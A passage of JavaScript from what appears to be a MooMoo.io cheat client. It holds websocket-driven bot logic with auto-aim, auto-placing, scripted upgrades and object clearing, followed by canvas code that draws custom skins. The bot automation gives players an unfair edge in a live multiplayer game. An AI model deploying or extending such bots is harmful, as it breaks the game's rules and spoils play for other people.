                                                botPlayer.nDir = UTILS.getDirect(nearObj, botPlayer, 0, 2);
                                                bot.sendWS("D", botPlayer.nDir);
                                            }
                                            if (izauto == 0) {
                                                bot.sendWS("K", 1);
                                                izauto = 1;
                                            }
                                            bot.buye(40, 0);
                                        } else {
                                            botPlayer.moveDir = gotoAim;
                                            bot.sendWS("f", botPlayer.moveDir);
                                            bot.sendWS("D", botPlayer.nDir);
                                            bot.fastGear();
                                        }
                                    } else {
                                        botPlayer.moveDir = gotoAim;
                                        bot.sendWS("f", botPlayer.moveDir);
                                        bot.sendWS("D", botPlayer.nDir);
                                        bot.fastGear();
                                    }
                                }
                            }



                            if (botObj.length > 0) {
                                if (getEl("mode").value == 'flex') {
                                    const dir = botPlayer.sid * ((Math.PI * 2) / botPlayer.sid);
                                    const x = Math.cos(Date.now() * 0.01) * 300 + player.x;
                                    const y = Math.sin(Date.now() * 0.01) * 300 + player.x;

                                    bot.sendWS("f", Math.atan2(y - botPlayer.y, x - botPlayer.x));

                                    const dist = Math.hypot(x - botPlayer.x, y - botPlayer.y);
                                    if (dist > 22) // 22 is player speed without booster hat
                                        return;
                                }
                            }


                            if (botObj.length > 0) {
                                nearObj = botObj.filter((e) => e.active && e.isItem && UTILS.getDist(e, botPlayer, 0, 2) <= (items.weapons[botPlayer.weaponIndex].range)).sort(function(a, b) {
                                    return UTILS.getDist(a, botPlayer, 0, 2) - UTILS.getDist(b, botPlayer, 0, 2);
                                })[0];

                                if (nearObj) {
                                    if (izauto == 0) {
                                        bot.sendWS("K", 1);
                                        izauto = 1;
                                    }
                                    if (botPlayer.nDir != UTILS.getDirect(nearObj, botPlayer, 0, 2)) {
                                        botPlayer.nDir = UTILS.getDirect(nearObj, botPlayer, 0, 2);
                                        bot.sendWS("D", botPlayer.nDir);
                                    }
                                    bot.buye(40, 0);
                                    bot.buye(11, 1);
                                } else {
                                    bot.fastGear();
                                    bot.buye(11, 1);
                                }
                                bot.buye(11, 1);
                                if (breakObjects.length > 0 && getEl("mode").value == 'clear') {
                                    // if (getEl("mode").value == "clear") {
                                    bot.selectWeapon(botPlayer.weapons[1]);
                                    let gotoDist = UTILS.getDist(breakObjects[0], botPlayer, 0, 2);
                                    let gotoAim = UTILS.getDirect(breakObjects[0], botPlayer, 0, 2);
                                    nearObj = botObj.filter((e) => e.active && (findSID(breakObjects, e.sid) ? true : !(e.trap && (player.sid == e.owner.sid || player.findAllianceBySid(e.owner.sid)))) && e.isItem && UTILS.getDist(e, botPlayer, 0, 2) <= (items.weapons[botPlayer.weaponIndex].range + e.scale)).sort(function(a, b) {
                                        return UTILS.getDist(a, botPlayer, 0, 2) - UTILS.getDist(b, botPlayer, 0, 2);
                                    })[0];
                                    if (nearObj) {
                                        let isPassed = UTILS.getDist(breakObjects[0], nearObj, 0, 0);
                                        if ((gotoDist - isPassed) > 0) {
                                            if (findSID(breakObjects, nearObj.sid) ? true : (nearObj.dmg || nearObj.trap)) {
                                                if (botPlayer.moveDir != undefined) {
                                                    botPlayer.moveDir = undefined;
                                                    bot.sendWS("f", botPlayer.moveDir);
                                                    bot.sendWS("D", botPlayer.nDir);
                                                }
                                            } else {
                                                botPlayer.moveDir = gotoAim;
                                                bot.sendWS("f", botPlayer.moveDir);
                                                bot.sendWS("D", botPlayer.nDir);
                                            }
                                            if (botPlayer.nDir != UTILS.getDirect(nearObj, botPlayer, 0, 2)) {
                                                botPlayer.nDir = UTILS.getDirect(nearObj, botPlayer, 0, 2);
                                                bot.sendWS("D", botPlayer.nDir);
                                            }
                                            if (izauto == 0) {
                                                bot.sendWS("K", 1);
                                                izauto = 1;
                                            }
                                            bot.buye(40, 0);
                                            bot.fastGear();
                                        } else {
                                            botPlayer.moveDir = gotoAim;
                                            bot.sendWS("f", botPlayer.moveDir);
                                            bot.sendWS("D", botPlayer.nDir);
                                            bot.fastGear();
                                        }
                                    } else {
                                        botPlayer.moveDir = gotoAim;
                                        bot.sendWS("f", botPlayer.moveDir);
                                        bot.sendWS("D", botPlayer.nDir);
                                        bot.fastGear();
                                    }
                                    if (gotoDist > 300) {
                                        if (UTILS.getDist(oldXY, botPlayer, 0, 2) > 90) {
                                            let aim = UTILS.getDirect(oldXY, botPlayer, 0, 2);
                                            bot.place(3, aim + 7.7);
                                            bot.place(3, aim - 7.7);
                                            bot.place(3, aim);
                                            oldXY = {
                                                x: botPlayer.x2,
                                                y: botPlayer.y2
                                            };
                                        }
                                    }
                                }
                            }

                            if (botObj.length > 0 && getEl("mode").value == 'zync') {
                                let wdaawdwad = botObj.filter((e) => e.active && e.isItem && UTILS.getDist(e, player, 0, 2) <= (items.weapons[botPlayer.weaponIndex].range + e.scale));

                                if(!wdaawdwad.length) {
                                    if(zoon == 'no')
                                        bot.sendWS("D", UTILS.getDirect(player, botPlayer, 0, 2));
                                    bot.sendWS("f", caf(player, botPlayer) + Math.PI);
                                }

                                if(wdaawdwad.length) {
                                    let gotoDist = UTILS.getDist(wdaawdwad[0], botPlayer, 0, 2);
                                    let gotoAim = UTILS.getDirect(wdaawdwad[0], botPlayer, 0, 2);
                                    nearObj = botObj.filter((e) => e.active && (findSID(wdaawdwad, e.sid) ? true : !(e.trap && (player.sid == e.owner.sid || player.findAllianceBySid(e.owner.sid)))) && e.isItem && UTILS.getDist(e, botPlayer, 0, 2) <= (items.weapons[botPlayer.weaponIndex].range + e.scale)).sort(function(a, b) {
                                        return UTILS.getDist(a, botPlayer, 0, 2) - UTILS.getDist(b, botPlayer, 0, 2);
                                    })[0];
                                    if (nearObj) {
                                        let isPassed = UTILS.getDist(wdaawdwad[0], nearObj, 0, 0);
                                        if ((gotoDist - isPassed) > 0) {
                                            if (findSID(wdaawdwad, nearObj.sid) ? true : (nearObj.dmg || nearObj.trap)) {
                                                if (botPlayer.moveDir != undefined) {
                                                    botPlayer.moveDir = undefined;
                                                    bot.sendWS("f", botPlayer.moveDir);
                                                    bot.sendWS("D", botPlayer.nDir);
                                                }
                                            } else {
                                                bot.sendWS("D", botPlayer.nDir);
                                            }
                                            if (botPlayer.nDir != UTILS.getDirect(nearObj, botPlayer, 0, 2)) {
                                                botPlayer.nDir = UTILS.getDirect(nearObj, botPlayer, 0, 2);
                                                bot.sendWS("D", botPlayer.nDir);
                                            }
                                            if (izauto == 0) {
                                                bot.sendWS("K", 1);
                                                izauto = 1;
                                            }
                                            bot.buye(40, 0);
                                            bot.fastGear();
                                        } else {
                                            if(zoon == 'no')
                                                bot.sendWS("D", UTILS.getDirect(nearObj, botPlayer, 0, 2));
                                            if(cdf(player, botPlayer) <= 110)
                                                bot.sendWS("f", undefined);
                                            else
                                                bot.sendWS("f", caf(player, botPlayer) + Math.PI);
                                        }
                                    } else {
                                        if(wdaawdwad.length) {
                                            if(zoon == 'no')
                                                bot.sendWS("D", UTILS.getDirect(wdaawdwad[0], botPlayer, 0, 2));
                                            if(cdf(player, botPlayer) <= 110)
                                                bot.sendWS("f", undefined);
                                            else
                                                bot.sendWS("f", caf(player, botPlayer) + Math.PI);
                                        } else {
                                            if(zoon == 'no')
                                                bot.sendWS("D", UTILS.getDirect(player, botPlayer, 0, 2));
                                            if(cdf(player, botPlayer) <= 110)
                                                bot.sendWS("f", undefined);
                                            else
                                                bot.sendWS("f", caf(player, botPlayer) + Math.PI);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if (type == "H") {
                let tmpData = data[0];
                for (let i = 0; i < tmpData.length;) {
                    botObjManager.add(tmpData[i], tmpData[i + 1], tmpData[i + 2], tmpData[i + 3], tmpData[i + 4],
                                      tmpData[i + 5], items.list[tmpData[i + 6]], true, (tmpData[i + 7] >= 0 ? {
                        sid: tmpData[i + 7]
                    } : null));
                    i += 8;
                }
            }
            if (type == "N") {
                let index = data[0];
                let value = data[1];
                if (botPlayer) {
                    botPlayer[index] = value;
                }
            }
            if (type == "O") {
                if (data[0] == botPlayer.sid) {
                    botPlayer.oldHealth = botPlayer.health;
                    botPlayer.health = data[1];
                    botPlayer.judgeShame();
                    if (botPlayer.oldHealth > botPlayer.health) {
                        if (botPlayer.shameCount < 5) {
                            for (let i = 0; i < 2; i++) {
                                bot.place(0, botPlayer.nDir);
                            }

                        } else {
                            setTimeout(() => {
                                for (let i = 0; i < 2; i++) {
                                    bot.place(0, botPlayer.nDir);
                                }
                            }, 95);
                        }
                    }
                }
            }
            if (type == "Q") {
                let sid = data[0];
                botObjManager.disableBySid(sid);
            }
            if (type == "R") {
                let sid = data[0];
                if (botPlayer.alive) botObjManager.removeAllItems(sid);
            }
            if (type == "S") {
                let index = data[0];
                let value = data[1];
                if (botPlayer) {
                    botPlayer.itemCounts[index] = value;
                }
            }
            if (type == "U") {
                if (data[0] > 0) {
                    if(getEl("setup").value == 'dm') {
                        if (botPlayer.upgraded == 0) {
                            bot.sendUpgrade(7);
                        } else if (botPlayer.upgraded == 1) {
                            bot.sendUpgrade(17);
                        } else if (botPlayer.upgraded == 2) {
                            bot.sendUpgrade(31);
                        } else if (botPlayer.upgraded == 3) {
                            bot.sendUpgrade(23);
                        } else if (botPlayer.upgraded == 4) {
                            bot.sendUpgrade(9);
                        } else if (botPlayer.upgraded == 5) {
                            bot.sendUpgrade(34);
                        } else if (botPlayer.upgraded == 6) {
                            bot.sendUpgrade(12);
                        } else if (botPlayer.upgraded == 7) {
                            bot.sendUpgrade(15);
                        }
                    } else if(getEl("setup").value == 'dr') {
                        if (botPlayer.upgraded == 0) {
                            bot.sendUpgrade(7);
                        } else if (botPlayer.upgraded == 1) {
                            bot.sendUpgrade(17);
                        } else if (botPlayer.upgraded == 2) {
                            bot.sendUpgrade(31);
                        } else if (botPlayer.upgraded == 3) {
                            bot.sendUpgrade(23);
                        } else if (botPlayer.upgraded == 4) {
                            bot.sendUpgrade(9);
                        } else if (botPlayer.upgraded == 5) {
                            bot.sendUpgrade(34);
                        } else if (botPlayer.upgraded == 6) {
                            bot.sendUpgrade(12);
                        } else if (botPlayer.upgraded == 7) {
                            bot.sendUpgrade(13);
                        }
                    } else if(getEl("setup").value == 'kh') {
                        if (botPlayer.upgraded == 0) {
                            bot.sendUpgrade(3);
                        } else if (botPlayer.upgraded == 1) {
                            bot.sendUpgrade(17);
                        } else if (botPlayer.upgraded == 2) {
                            bot.sendUpgrade(31);
                        } else if (botPlayer.upgraded == 3) {
                            bot.sendUpgrade(27);
                        } else if (botPlayer.upgraded == 4) {
                            bot.sendUpgrade(10);
                        } else if (botPlayer.upgraded == 5) {
                            bot.sendUpgrade(34);
                        } else if (botPlayer.upgraded == 6) {
                            bot.sendUpgrade(4);
                        } else if (botPlayer.upgraded == 7) {
                            bot.sendUpgrade(25);
                        }
                    } else if(getEl("setup").value == 'zd') {
                        if (botPlayer.upgraded == 0) {
                            bot.sendUpgrade(3);
                        } else if (botPlayer.upgraded == 1) {
                            bot.sendUpgrade(17);
                        } else if (botPlayer.upgraded == 2) {
                            bot.sendUpgrade(31);
                        } else if (botPlayer.upgraded == 3) {
                            bot.sendUpgrade(27);
                        } else if (botPlayer.upgraded == 4) {
                            bot.sendUpgrade(9);
                        } else if (botPlayer.upgraded == 5) {
                            bot.sendUpgrade(34);
                        } else if (botPlayer.upgraded == 6) {
                            bot.sendUpgrade(12);
                        } else if (botPlayer.upgraded == 7) {
                            bot.sendUpgrade(15);
                        }
                    }
                    botPlayer.upgraded++;
                }
            }
            if (type == "V") {
                let tmpData = data[0];
                let wpn = data[1];
                if (tmpData) {
                    if (wpn) botPlayer.weapons = tmpData;
                    else botPlayer.items = tmpData;
                }

            }
            if (type == "5") {
                let type = data[0];
                let id = data[1];
                let index = data[2];
                if (index) {
                    if (!type)
                        botPlayer.tails[id] = 1;
                    else
                        botPlayer.latestTail = id;
                } else {
                    if (!type)
                        botPlayer.skins[id] = 1;
                    else
                        botPlayer.latestSkin = id;
                }
            }

            if (type == "6") {
                let id = data[0];
                let mzg = data[1]+'';
                if(id == player.sid && mzg.includes("Sync")) {
                    bot.zync(botPlayer.near);
                }
            }
        };
        bot.onclose = function() {
            botPlayer.inGame = false;
            bD.inGame = false;
        };
    }

    // RENDER LEAF:
    function renderLeaf(x, y, l, r, ctxt) {
        let endX = x + (l * Math.cos(r));
        let endY = y + (l * Math.sin(r));
        let width = l * 0.4;
        ctxt.moveTo(x, y);
        ctxt.beginPath();
        ctxt.quadraticCurveTo(((x + endX) / 2) + (width * Math.cos(r + Math.PI / 2)),
                              ((y + endY) / 2) + (width * Math.sin(r + Math.PI / 2)), endX, endY);
        ctxt.quadraticCurveTo(((x + endX) / 2) - (width * Math.cos(r + Math.PI / 2)),
                              ((y + endY) / 2) - (width * Math.sin(r + Math.PI / 2)), x, y);
        ctxt.closePath();
        ctxt.fill();
        ctxt.stroke();
    }

    // RENDER CIRCLE:
    function renderCircle(x, y, scale, tmpContext, dontStroke, dontFill) {
        tmpContext = tmpContext || mainContext;
        tmpContext.beginPath();
        tmpContext.arc(x, y, scale, 0, 2 * Math.PI);
        if (!dontFill) tmpContext.fill();
        if (!dontStroke) tmpContext.stroke();
    }

    function renderHealthCircle(x, y, scale, tmpContext, dontStroke, dontFill) {
        tmpContext = tmpContext || mainContext;
        tmpContext.beginPath();
        tmpContext.arc(x, y, scale, 0, 2 * Math.PI);
        if (!dontFill) tmpContext.fill();
        if (!dontStroke) tmpContext.stroke();
    }

    // RENDER STAR SHAPE:
    function renderStar(ctxt, spikes, outer, inner) {
        let rot = Math.PI / 2 * 3;
        let x, y;
        let step = Math.PI / spikes;
        ctxt.beginPath();
        ctxt.moveTo(0, -outer);
        for (let i = 0; i < spikes; i++) {
            x = Math.cos(rot) * outer;
            y = Math.sin(rot) * outer;
            ctxt.lineTo(x, y);
            rot += step;
            x = Math.cos(rot) * inner;
            y = Math.sin(rot) * inner;
            ctxt.lineTo(x, y);
            rot += step;
        }
        ctxt.lineTo(0, -outer);
        ctxt.closePath();
    }

    function renderHealthStar(ctxt, spikes, outer, inner) {
        let rot = Math.PI / 2 * 3;
        let x, y;
        let step = Math.PI / spikes;
        ctxt.beginPath();
        ctxt.moveTo(0, -outer);
        for (let i = 0; i < spikes; i++) {
            x = Math.cos(rot) * outer;
            y = Math.sin(rot) * outer;
            ctxt.lineTo(x, y);
            rot += step;
            x = Math.cos(rot) * inner;
            y = Math.sin(rot) * inner;
            ctxt.lineTo(x, y);
            rot += step;
        }
        ctxt.lineTo(0, -outer);
        ctxt.closePath();
    }

    // RENDER RECTANGLE:
    function renderRect(x, y, w, h, ctxt, dontStroke, dontFill) {
        if (!dontFill) ctxt.fillRect(x - (w / 2), y - (h / 2), w, h);
        if (!dontStroke) ctxt.strokeRect(x - (w / 2), y - (h / 2), w, h);
    }

    function renderHealthRect(x, y, w, h, ctxt, dontStroke, dontFill) {
        if (!dontFill) ctxt.fillRect(x - (w / 2), y - (h / 2), w, h);
        if (!dontStroke) ctxt.strokeRect(x - (w / 2), y - (h / 2), w, h);
    }

    // RENDER RECTCIRCLE:
    function renderRectCircle(x, y, s, sw, seg, ctxt, dontStroke, dontFill) {
        ctxt.save();
        ctxt.translate(x, y);
        seg = Math.ceil(seg / 2);
        for (let i = 0; i < seg; i++) {
            renderRect(0, 0, s * 2, sw, ctxt, dontStroke, dontFill);
            ctxt.rotate(Math.PI / seg);
        }
        ctxt.restore();
    }

    // RENDER BLOB:
    function renderBlob(ctxt, spikes, outer, inner) {
        let rot = Math.PI / 2 * 3;
        let x, y;
        let step = Math.PI / spikes;
        let tmpOuter;
        ctxt.beginPath();
        ctxt.moveTo(0, -inner);
        for (let i = 0; i < spikes; i++) {
            tmpOuter = UTILS.randInt(outer + 0.9, outer * 1.2);
            ctxt.quadraticCurveTo(Math.cos(rot + step) * tmpOuter, Math.sin(rot + step) * tmpOuter,
                                  Math.cos(rot + (step * 2)) * inner, Math.sin(rot + (step * 2)) * inner);
            rot += step * 2;
        }
        ctxt.lineTo(0, -inner);
        ctxt.closePath();
    }

    // RENDER TRIANGLE:
    function renderTriangle(s, ctx) {
        ctx = ctx || mainContext;
        let h = s * (Math.sqrt(3) / 2);
        ctx.beginPath();
        ctx.moveTo(0, -h / 2);
        ctx.lineTo(-s / 2, h / 2);
        ctx.lineTo(s / 2, h / 2);
        ctx.lineTo(0, -h / 2);
        ctx.fill();
        ctx.closePath();
    }

    // PREPARE MENU BACKGROUND:
    function prepareMenuBackground() {
        let tmpMid = config.mapScale / 2;
        let attempts = 0;
        for (let i = 0; i < items.list.length * 3;) {
            if (attempts >= 1000) break;
            attempts++;
            let type = items.list[UTILS.randInt(0, items.list.length - 1)];
            let data = {
                x: tmpMid + UTILS.randFloat(-1000, 1000),
                y: tmpMid + UTILS.randFloat(-600, 600),
                dir: UTILS.fixTo(Math.random() * (Math.PI * 2), 2)
            };
            if (objectManager.checkItemLocation(data.x, data.y, type.scale, 0.6, type.id, true)) {
                objectManager.add(i, data.x, data.y, data.dir, type.scale, type.id, type);
            } else {
                continue;
            }
            i++;
        }
    }
    const speed = 35;
    // RENDER PLAYERS:
    function renderDeadPlayers(xOffset, yOffset) {
        mainContext.fillStyle = "#91b2db";
        const currentTime = Date.now();
        deadPlayers.filter(dead => dead.active).forEach((dead) => {
            if (!dead.startTime) {
                dead.startTime = currentTime;
                dead.angle = 0;
                dead.radius = 0.1;
            }
            const timeElapsed = currentTime - dead.startTime;
            const maxAlpha = 1;
            dead.alpha = Math.max(0, maxAlpha - (timeElapsed / 3000));
            dead.animate(delta);
            mainContext.globalAlpha = dead.alpha;
            mainContext.strokeStyle = outlineColor;
            mainContext.save();
            mainContext.translate(dead.x - xOffset, dead.y - yOffset);
            dead.radius -= 0.001;
            dead.angle += 0.0174533;
            const moveSpeed = 1;
            const x = dead.radius * Math.cos(dead.angle);
            const y = dead.radius * Math.sin(dead.angle);
            dead.x += x * moveSpeed;
            dead.y += y * moveSpeed;
            mainContext.rotate(dead.angle);
            renderDeadPlayer(dead, mainContext);
            mainContext.restore();
            mainContext.fillStyle = "#91b2db";
            if (timeElapsed >= 3000) {
                dead.active = false;
                dead.startTime = null;
            }
        });
    }
    // RENDER PLAYERS:
    function renderPlayers(xOffset, yOffset, zIndex) {
        mainContext.globalAlpha = 1;
        mainContext.fillStyle = "#91b2db";
        for (var i = 0; i < players.length; ++i) {
            tmpObj = players[i];
            if (tmpObj.zIndex == zIndex) {
                tmpObj.animate(delta);
                if (tmpObj.visible) {
                    tmpObj.skinRot += (0.002 * delta);
                    tmpDir = (!configs.showDir && !useWasd && tmpObj == player) ? configs.attackDir ? getVisualDir() : getSafeDir() : (tmpObj.dir||0);
                    mainContext.save();
                    mainContext.translate(tmpObj.x - xOffset, tmpObj.y - yOffset);
                    // RENDER PLAYER:
                    mainContext.rotate(tmpDir + tmpObj.dirPlus);
                    renderPlayer(tmpObj, mainContext);
                    mainContext.restore();

                }
            }
        }
    }
    // RENDER DEAD PLAYER:
    function renderDeadPlayer(obj, ctxt) {
        ctxt = ctxt || mainContext;
        ctxt.lineWidth = outlineWidth;
        ctxt.lineJoin = "miter";
        let handAngle = (Math.PI / 4) * (items.weapons[obj.weaponIndex].armS||1);
        let oHandAngle = (obj.buildIndex < 0)?(items.weapons[obj.weaponIndex].hndS||1):1;
        let oHandDist = (obj.buildIndex < 0)?(items.weapons[obj.weaponIndex].hndD||1):1;
        // TAIL/CAPE:
        renderTail2(13, ctxt, obj);
        // WEAPON BELLOW HANDS:
        if (obj.buildIndex < 0 && !items.weapons[obj.weaponIndex].aboveHand) {
            renderTool(items.weapons[obj.weaponIndex], config.weaponVariants[obj.weaponVariant || 0].src || "", obj.scale, 0, ctxt);
            if (items.weapons[obj.weaponIndex].projectile != undefined && !items.weapons[obj.weaponIndex].hideProjectile) {
                renderProjectile(obj.scale, 0,
                                 items.projectiles[items.weapons[obj.weaponIndex].projectile], mainContext);
            }
        }
        // HANDS:
        ctxt.fillStyle = "#ececec";
        renderCircle(obj.scale * Math.cos(handAngle), (obj.scale * Math.sin(handAngle)), 14);
        renderCircle((obj.scale * oHandDist) * Math.cos(-handAngle * oHandAngle),
                     (obj.scale * oHandDist) * Math.sin(-handAngle * oHandAngle), 14);
        // WEAPON ABOVE HANDS:
        if (obj.buildIndex < 0 && items.weapons[obj.weaponIndex].aboveHand) {
            renderTool(items.weapons[obj.weaponIndex], config.weaponVariants[obj.weaponVariant || 0].src || "", obj.scale, 0, ctxt);
            if (items.weapons[obj.weaponIndex].projectile != undefined && !items.weapons[obj.weaponIndex].hideProjectile) {
                renderProjectile(obj.scale, 0,
                                 items.projectiles[items.weapons[obj.weaponIndex].projectile], mainContext);
            }
        }
        // BUILD ITEM:
        if (obj.buildIndex >= 0) {
            var tmpSprite = getItemSprite(items.list[obj.buildIndex]);
            ctxt.drawImage(tmpSprite, obj.scale - items.list[obj.buildIndex].holdOffset, -tmpSprite.width / 2);
        }
        // BODY:
        renderCircle(0, 0, obj.scale, ctxt);
        // SKIN
        renderSkin2(48, ctxt, null, obj)
    }

    // RENDER PLAYER:
    function renderPlayer(obj, ctxt) {
        ctxt = ctxt || mainContext;
        ctxt.lineWidth = outlineWidth;
        ctxt.lineJoin = "miter";
        let handAngle = (Math.PI / 4) * (items.weapons[obj.weaponIndex].armS || 1);
        let oHandAngle = (obj.buildIndex < 0) ? (items.weapons[obj.weaponIndex].hndS || 1) : 1;
        let oHandDist = (obj.buildIndex < 0) ? (items.weapons[obj.weaponIndex].hndD || 1) : 1;

        let katanaMusket = (obj == player && obj.weapons[0] == 3 && obj.weapons[1] == 15);

        // TAIL/CAPE:
        if (obj.tailIndex > 0) {
            renderTailTextureImage(obj.tailIndex, ctxt, obj);
        }

        // WEAPON BELLOW HANDS:
        if (obj.buildIndex < 0 && !items.weapons[obj.weaponIndex].aboveHand) {
            renderTool(items.weapons[katanaMusket ? 4 : obj.weaponIndex], config.weaponVariants[obj.weaponVariant].src, obj.scale, 0, ctxt);
            if (items.weapons[obj.weaponIndex].projectile != undefined && !items.weapons[obj.weaponIndex].hideProjectile) {
                renderProjectile(obj.scale, 0,
                                 items.projectiles[items.weapons[obj.weaponIndex].projectile], mainContext);
            }
        }

        // HANDS:
        ctxt.fillStyle = config.skinColors[obj.skinColor];
        renderCircle(obj.scale * Math.cos(handAngle), (obj.scale * Math.sin(handAngle)), 14);
        renderCircle((obj.scale * oHandDist) * Math.cos(-handAngle * oHandAngle),
                     (obj.scale * oHandDist) * Math.sin(-handAngle * oHandAngle), 14);

        // WEAPON ABOVE HANDS:
        if (obj.buildIndex < 0 && items.weapons[obj.weaponIndex].aboveHand) {
            renderTool(items.weapons[obj.weaponIndex], config.weaponVariants[obj.weaponVariant].src, obj.scale, 0, ctxt);
            if (items.weapons[obj.weaponIndex].projectile != undefined && !items.weapons[obj.weaponIndex].hideProjectile) {
                renderProjectile(obj.scale, 0,
                                 items.projectiles[items.weapons[obj.weaponIndex].projectile], mainContext);
            }
        }

        // BUILD ITEM:
        if (obj.buildIndex >= 0) {
            var tmpSprite = getItemSprite(items.list[obj.buildIndex]);
            ctxt.drawImage(tmpSprite, obj.scale - items.list[obj.buildIndex].holdOffset, -tmpSprite.width / 2);
        }

        // BODY:
        renderCircle(0, 0, obj.scale, ctxt);

        // SKIN:
        if (obj.skinIndex > 0) {
            ctxt.rotate(Math.PI / 2);
            renderTextureSkin(obj.skinIndex, ctxt, null, obj);
        }

    }

    // RENDER NORMAL SKIN
    var skinSprites2 = {};
    var skinPointers2 = {};
    function renderSkin2(index, ctxt, parentSkin, owner) {
        tmpSkin = skinSprites2[index];
        if (!tmpSkin) {
            var tmpImage = new Image();
            tmpImage.onload = function() {
                this.isLoaded = true;
                this.onload = null;
            };
            //tmpImage.src = "https://moomoo.io/img/hats/hat_" + index + ".png";
            tmpImage.src = "https://moomoo.io/img/hats/hat_" + index + ".png";
            skinSprites2[index] = tmpImage;
            tmpSkin = tmpImage;
        }
        var tmpObj = parentSkin||skinPointers2[index];
        if (!tmpObj) {
            for (var i = 0; i < hats.length; ++i) {
                if (hats[i].id == index) {
                    tmpObj = hats[i];
                    break;
                }
            }
            skinPointers2[index] = tmpObj;
        }
        if (tmpSkin.isLoaded)
            ctxt.drawImage(tmpSkin, -tmpObj.scale/2, -tmpObj.scale/2, tmpObj.scale, tmpObj.scale);
        if (!parentSkin && tmpObj.topSprite) {
            ctxt.save();
            ctxt.rotate(owner.skinRot);
            renderSkin2(index + "_top", ctxt, tmpObj, owner);
            ctxt.restore();
        }
    }

    // RENDER SKIN:
    function renderTextureSkin(index, ctxt, parentSkin, owner) {
        if (!(tmpSkin = skinSprites[index + (txt ? "lol" : 0)])) {
            var tmpImage = new Image();
            tmpImage.onload = function() {
                this.isLoaded = true,
                    this.onload = null
            }
                ,
                tmpImage.src = setSkinTextureImage(index, "hat", index),
                skinSprites[index + (txt ? "lol" : 0)] = tmpImage,
                tmpSkin = tmpImage
        }
        var tmpObj = parentSkin||skinPointers[index];
        if (!tmpObj) {
            for (var i = 0; i < hats.length; ++i) {
                if (hats[i].id == index) {
                    tmpObj = hats[i];
                    break;
                }
            }
            skinPointers[index] = tmpObj;
        }
        if (tmpSkin.isLoaded)
            ctxt.drawImage(tmpSkin, -tmpObj.scale/2, -tmpObj.scale/2, tmpObj.scale, tmpObj.scale);
        if (!parentSkin && tmpObj.topSprite) {
            ctxt.save();
            ctxt.rotate(owner.skinRot);
            renderSkin(index + "_top", ctxt, tmpObj, owner);
            ctxt.restore();
        }
    }

    var FlareZHat = {
        7: "https://i.imgur.com/vAOzlyY.png",
        15: "https://i.imgur.com/YRQ8Ybq.png",
        40: "https://i.imgur.com/Xzmg27N.png",
        26: "https://i.imgur.com/I0xGtyZ.png",
        55: "https://i.imgur.com/uYgDtcZ.png",
        20: "https://i.imgur.com/f5uhWCk.png",
    };

    function setSkinTextureImage(id, type, id2) {
        if (true) {
            if(FlareZHat[id] && type == "hat") {
                return FlareZHat[id];
            } else {
                if(type == "acc") {
                    return ".././img/accessories/access_" + id + ".png";
                } else if(type == "hat") {
                    return ".././img/hats/hat_" + id + ".png";
                } else {
                    return ".././img/weapons/" + id + ".png";
                }
            }
        } else {
            if(type == "acc") {
                return ".././img/accessories/access_" + id + ".png";
            } else if(type == "hat") {
                return ".././img/hats/hat_" + id + ".png";
            } else {
                return ".././img/weapons/" + id + ".png";
            }
        }
    }
    // RENDER SKINS:
    let skinSprites = {};
    let skinPointers = {};
    let tmpSkin;

    function renderSkin(index, ctxt, parentSkin, owner) {
        tmpSkin = skinSprites[index];
        if (!tmpSkin) {
            let tmpImage = new Image();
            tmpImage.onload = function() {
                this.isLoaded = true;
                this.onload = null;
            };
            tmpImage.src = "https://moomoo.io/img/hats/hat_" + index + ".png";
            skinSprites[index] = tmpImage;
            tmpSkin = tmpImage;
        }
        let tmpObj = parentSkin || skinPointers[index];
        if (!tmpObj) {
            for (let i = 0; i < hats.length; ++i) {
                if (hats[i].id == index) {
                    tmpObj = hats[i];
                    break;
                }
            }
            skinPointers[index] = tmpObj;
        }
        if (tmpSkin.isLoaded)
            ctxt.drawImage(tmpSkin, -tmpObj.scale / 2, -tmpObj.scale / 2, tmpObj.scale, tmpObj.scale);
        if (!parentSkin && tmpObj.topSprite) {
            ctxt.save();
            ctxt.rotate(owner.skinRot);
            renderSkin(index + "_top", ctxt, tmpObj, owner);
            ctxt.restore();
        }
    }

    // RENDER TAIL:
    var FlareZAcc = {
        21: "https://i.imgur.com/4ddZert.png",
        19: "https://i.imgur.com/sULkUZT.png",
    };
    function setTailTextureImage(id, type, id2) {
        if (true) {
            if(FlareZAcc[id] && type == "acc") {
                return FlareZAcc[id];
            } else {
                if(type == "acc") {
                    return ".././img/accessories/access_" + id + ".png";
                } else if(type == "hat") {
                    return ".././img/hats/hat_" + id + ".png";
                } else {
                    return ".././img/weapons/" + id + ".png";
                }
            }
        } else {
            if(type == "acc") {
                return ".././img/accessories/access_" + id + ".png";
            } else if(type == "hat") {
                return ".././img/hats/hat_" + id + ".png";
            } else {
                return ".././img/weapons/" + id + ".png";
            }
        }
    }
    function renderTailTextureImage(index, ctxt, owner) {
        if (!(tmpSkin = accessSprites[index + (txt ? "lol" : 0)])) {
            var tmpImage = new Image();
            tmpImage.onload = function() {
                this.isLoaded = true,
                    this.onload = null
            }
                ,
                tmpImage.src = setTailTextureImage(index, "acc"),//".././img/accessories/access_" + index + ".png";
                accessSprites[index + (txt ? "lol" : 0)] = tmpImage,
                tmpSkin = tmpImage;
        }
        var tmpObj = accessPointers[index];
        if (!tmpObj) {
            for (var i = 0; i < accessories.length; ++i) {
                if (accessories[i].id == index) {
                    tmpObj = accessories[i];
                    break;
                }
            }
            accessPointers[index] = tmpObj;
        }
        if (tmpSkin.isLoaded) {
            ctxt.save();
            ctxt.translate(-20 - (tmpObj.xOff||0), 0);
            if (tmpObj.spin)
                ctxt.rotate(owner.skinRot);
            ctxt.drawImage(tmpSkin, -(tmpObj.scale/2), -(tmpObj.scale/2), tmpObj.scale, tmpObj.scale);
            ctxt.restore();
        }
    }

    let accessSprites = {};
    let accessPointers = {};
    var txt = true;

    function renderTail(index, ctxt, owner) {
        tmpSkin = accessSprites[index];
        if (!tmpSkin) {
            let tmpImage = new Image();
            tmpImage.onload = function() {
                this.isLoaded = true;
                this.onload = null;
            };
            tmpImage.src = "https://moomoo.io/img/accessories/access_" + index + ".png";
            accessSprites[index] = tmpImage;
            tmpSkin = tmpImage;
        }
        let tmpObj = accessPointers[index];
        if (!tmpObj) {
            for (let i = 0; i < accessories.length; ++i) {
                if (accessories[i].id == index) {
                    tmpObj = accessories[i];
                    break;
                }
            }
            accessPointers[index] = tmpObj;
        }
        if (tmpSkin.isLoaded) {
            ctxt.save();
            ctxt.translate(-20 - (tmpObj.xOff || 0), 0);
            if (tmpObj.spin)
